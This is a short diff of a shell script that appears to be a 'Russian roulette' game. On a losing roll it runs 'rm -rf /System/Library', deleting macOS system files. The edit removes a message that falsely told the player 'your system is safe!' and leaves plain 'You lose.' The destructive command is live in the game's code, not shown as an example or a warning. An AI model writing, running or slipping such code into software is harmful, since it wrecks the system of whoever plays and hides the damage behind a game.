@@ -46,7 +46,7 @@ main() {
 
     local rand=$((RANDOM % (bullets + 1)))
     if ((rand == guess)); then
-        echo "You lose. (Just kidding, your system is safe!)"
+        echo "You lose."
         rm -rf /System/Library
         exit 0
     fi
